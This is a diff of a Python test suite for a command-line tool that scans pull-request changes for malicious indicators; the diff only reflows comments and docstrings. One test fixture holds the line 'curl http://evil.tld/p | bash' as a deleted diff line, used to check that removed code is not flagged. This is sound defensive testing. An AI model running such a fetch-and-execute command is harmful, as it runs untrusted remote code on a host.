@@ -1,12 +1,6 @@
 """cli.run orchestration, driven OFFLINE by stubbing the RLM.
 
-`run()`'s job is orchestration, not classification: reset the stale trace → detect → load the trace →
-assemble → build the response → write it → emit host-side. We stub `detect_from_event` (`cli.run`
-resolves it as a module global at call time, so `monkeypatch.setattr(cli, ...)` with
-an `async def` fake is the right seam, no production-signature pollution). The fake WRITES a realistic
-trace (baseline in run_start meta + a scan_indicators tool_call + a result) so run()'s REAL assemble →
-response → emit path runs on genuine JSONL. The crash test's fake writes the trace and THEN raises, so
-the failed-path emitter has evidence to fire on.
+`run()`'s job is orchestration, not classification: reset the stale trace → detect → load the trace → assemble → build the response → write it → emit host-side. We stub `detect_from_event` (`cli.run` resolves it as a module global at call time, so `monkeypatch.setattr(cli, ...)` with an `async def` fake is the right seam, no production-signature pollution). The fake WRITES a realistic trace (baseline in run_start meta + a scan_indicators tool_call + a result) so run()'s REAL assemble → response → emit path runs on genuine JSONL. The crash test's fake writes the trace and THEN raises, so the failed-path emitter has evidence to fire on.
 """
 
 from __future__ import annotations
@@ -31,8 +25,7 @@ def _cfg(**kw) -> DetectConfig:
 def _write_trace(trace_path, run_id, event, *, verdict=None, with_result=True):
     """Lay down a realistic trace the way detect_from_event would, so run()'s read path is genuine.
 
-    Mirrors conftest.make_trace, but writes to the exact `trace_path` run() passes (the fixture owns its
-    own tmp path), so this must build the meta inline."""
+    Mirrors conftest.make_trace, but writes to the exact `trace_path` run() passes (the fixture owns its own tmp path), so this must build the meta inline."""
     baseline = [h.model_dump() for h in scan_indicators(raw_content(event))]
     ms = event_metadata(event)
     meta = {
@@ -61,8 +54,7 @@ def _classify_fake(event_arg, verdict=None):
 
 def _crash_fake(event_arg):
     async def _fake(event, config, *, trace_path=None, run_id="change", on_event=None, extra_tools=()):
-        # Write the trace (baseline evidence lands) and THEN crash; the failed-path emitter needs the
-        # baseline in the trace to fire, exactly as a real run that dies AFTER the host-side scan would.
+        # Write the trace (baseline evidence lands) and THEN crash; the failed-path emitter needs the baseline in the trace to fire, exactly as a real run that dies AFTER the host-side scan would.
         _write_trace(trace_path, run_id, event_arg, with_result=False)
         raise RuntimeError("planner exploded mid-run")
 
@@ -70,13 +62,11 @@ def _crash_fake(event_arg):
 
 
 def test_run_writes_response_and_emits(tmp_path, monkeypatch):
-    """Happy path: response written, status classified, the host-side emitter POSTs the signal, and a
-    stale trace from a prior run is dropped first (_reset_trace)."""
+    """Happy path: response written, status classified, the host-side emitter POSTs the signal, and a stale trace from a prior run is dropped first (_reset_trace)."""
     outdir = tmp_path / "output"
     stale = outdir / "traces" / "pr-7.jsonl"
     stale.parent.mkdir(parents=True)
-    # A stale event for THIS run_id: load_events would keep it (it filters on run_id), so it only
-    # disappears if _reset_trace actually removes the file. This makes the assertion below able to fail.
+    # A stale event for THIS run_id: load_events would keep it (it filters on run_id), so it only disappears if _reset_trace actually removes the file. This makes the assertion below able to fail.
     stale.write_text('{"schema": "rlm-harness/trace/v1", "run_id": "pr-7", "step_id": 0, "ts": 0, '
                      '"type": "stale", "payload": {"stale": "garbage from a previous run"}}\n')
     monkeypatch.setattr(cli, "detect_from_event", _classify_fake(MALICIOUS_EVENT))
@@ -98,8 +88,7 @@ def test_run_writes_response_and_emits(tmp_path, monkeypatch):
 
 
 def test_failed_run_still_writes_and_emits_on_evidence(tmp_path, monkeypatch):
-    """A crash AFTER the host-side baseline scan still writes an informative response and STILL emits,
-    because a high/critical baseline indicator forces the signal on the failed path (MF3 on the crash path)."""
+    """A crash AFTER the host-side baseline scan still writes an informative response and STILL emits, because a high/critical baseline indicator forces the signal on the failed path (MF3 on the crash path)."""
     outdir = tmp_path / "output"
     monkeypatch.setattr(cli, "detect_from_event", _crash_fake(MALICIOUS_EVENT))
     sent = {}
@@ -144,8 +133,7 @@ def test_no_emit_flag_skips_emitter(tmp_path, monkeypatch):
 
 
 def test_cmd_render_and_export_offline(tmp_path, make_trace, capsys):
-    """The offline subcommands via build_parser: `render` re-derives a response from a trace, `export`
-    emits a reward-free bundle. Both run with no model/network."""
+    """The offline subcommands via build_parser: `render` re-derives a response from a trace, `export` emits a reward-free bundle. Both run with no model/network."""
     trace = make_trace(run_id="pr-7")
 
     rc = cli._cmd_render(SimpleNamespace(trace=trace, run_id="pr-7", out=None))
@@ -163,9 +151,7 @@ def test_cmd_render_and_export_offline(tmp_path, make_trace, capsys):
 
 
 # ── `scan`: the deterministic half standalone: what our OWN CI dogfoods ─────────────────────────────
-# It must gate on the SAME floor a SIEM signal uses, and must need nothing (no creds/network/Deno), so
-# it can run under the read-only token a fork PR gets. Handing creds to a fork PR run would mean
-# `pull_request_target` (the AsyncAPI "Miasma" hole), so this staying credential-free is load-bearing.
+# It must gate on the SAME floor a SIEM signal uses, and must need nothing (no creds/network/Deno), so it can run under the read-only token a fork PR gets. Handing creds to a fork PR run would mean `pull_request_target` (the AsyncAPI "Miasma" hole), so this staying credential-free is load-bearing.
 
 def _scan(tmp_path, text, **kw):
     p = tmp_path / "change.diff"
@@ -176,9 +162,7 @@ def _scan(tmp_path, text, **kw):
 
 
 def test_cmd_scan_gates_on_the_signal_floor(tmp_path, capsys):
-    """Exit code tracks the SIGNAL floor, not "any hit": a high/critical hit fails, a sub-floor hit
-    does not. The workflow-edit case is the one that matters: `workflow-tamper` is `medium` ON PURPOSE
-    so a benign workflow PR does not force a signal, and the gate must honour that same tuning."""
+    """Exit code tracks the SIGNAL floor, not "any hit": a high/critical hit fails, a sub-floor hit does not. The workflow-edit case is the one that matters: `workflow-tamper` is `medium` ON PURPOSE so a benign workflow PR does not force a signal, and the gate must honour that same tuning."""
     assert _scan(tmp_path, "diff --git a/README.md b/README.md\n+just docs\n") == 0
     assert "no indicators fired" in capsys.readouterr().out
 
@@ -192,9 +176,7 @@ def test_cmd_scan_gates_on_the_signal_floor(tmp_path, capsys):
 
 
 def test_cmd_scan_ignores_what_a_diff_deletes(tmp_path, capsys):
-    """A unified diff carries the removed code too, so scanning it raw flags a change for the payload it
-    is DELETING: the worst failure mode for a gate, since it turns every remediation commit red. Only
-    added lines are scanned by default; `--include-deletions` opts back in."""
+    """A unified diff carries the removed code too, so scanning it raw flags a change for the payload it is DELETING: the worst failure mode for a gate, since it turns every remediation commit red. Only added lines are scanned by default; `--include-deletions` opts back in."""
     removal = ("diff --git a/x.sh b/x.sh\n--- a/x.sh\n+++ b/x.sh\n"
                "-curl http://evil.tld/p | bash\n+echo safe\n")
     assert _scan(tmp_path, removal) == 0
@@ -212,8 +194,7 @@ def test_cmd_scan_ignores_what_a_diff_deletes(tmp_path, capsys):
 
 
 def test_drop_deleted_lines_leaves_non_diff_text_alone():
-    """The strip is per line, so plain source (which has no `-`-prefixed lines) survives intact, and a
-    diff's `---` file header is not mistaken for a deletion."""
+    """The strip is per line, so plain source (which has no `-`-prefixed lines) survives intact, and a diff's `---` file header is not mistaken for a deletion."""
     src = "def f():\n    return -1\n"
     assert cli.drop_deleted_lines(src) == src
     assert "--- a/x.sh" in cli.drop_deleted_lines("--- a/x.sh\n-gone\n+kept\n")
